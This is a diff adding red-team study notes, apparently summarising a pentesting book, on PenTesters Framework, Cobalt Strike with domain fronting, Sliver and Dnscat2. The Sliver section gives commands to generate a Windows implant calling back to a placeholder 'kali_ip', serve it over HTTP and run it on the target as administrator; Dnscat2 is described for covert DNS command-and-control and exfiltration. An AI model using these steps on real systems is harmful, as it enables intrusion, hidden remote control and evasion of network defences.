@@ -31,3 +31,88 @@
 #### Assumed breach exercise
 - Since Red Team campaigns focus on detection/mitigation instead of vulnerabilities, we can do some more unique assessments.
 - One assessment that provides customers/clients with immense benefit is called an assumed breach exercise where there will always be 0-days assumption. 
+
+
+#### PenTesters Framework
+- go to following path
+    ```
+    cd /opt/ptf
+    ```
+- Run
+    ```
+    ./ptf
+    ```
+- then
+    ```
+    help
+    ```
+- then
+    ```
+    show modules
+    ```
+- All tools are installed under pentest
+    ```
+    cd /pentest
+    ```
+
+## Cobalt Strike
+- It is a tool for post exploitation, lateral movement, staying hidden in the network, and exfiltration
+- To take your redirectors up a notch, we utilize Domain Fronting. 
+- Domain Fronting is a collection of techniques to make use of other people’s domains and infrastructures as redirectors for your controller
+- This can be accomplished by utilizing popular Content Delivery Networks (CDNs) such as Amazon’s CloudFront or other Google Hosts to mask traffic origins
+
+## Powershell empire
+- In place of this empire , i have used sliver 
+- To Execute sliver
+    - Open terminal 1 and type
+        ```
+        sliver
+        ```
+        ```
+        update
+        ```
+        ```
+        help
+        ```
+        ```
+        generate --help
+        ```
+    - To create payload
+        ```
+        generate --os windows --arch 64bit --mtls kali_ip -s /opt/tmp
+        ```
+    - To change file name
+        ```
+        sudo mv file.ext newfile.exe
+        ```
+    -To checks available jobs
+        ```
+        jobs
+        ```
+    - To check sessions
+        ```
+        sessions
+        ```
+
+    
+    - Now open Terminal 2 and execute
+        ```
+        python3 -m http.server 9000
+        ```
+
+    - Now go to target window and open browser and type
+        ```
+        kali_ip:9000
+        ```
+    - Now you will find the payload and download it and run as administrator in windows
+
+
+## Dnscat2
+- This tool is designed to create an encrypted Command and Control (C2) channel over the DNS protocol
+- C2 and exfiltration over DNS provides a great mechanism to hide your traffic, evade network sensors, and get around network restrictions
+- it does not require root privileges and allows both shell access and exfiltration
+    ![Screenshot](/images/dnscat2.png)
+
+- Instead of communicating over HTTP/HTTPS like modern C2 frameworks, it communicates through DNS queries and responses
+
+page 32
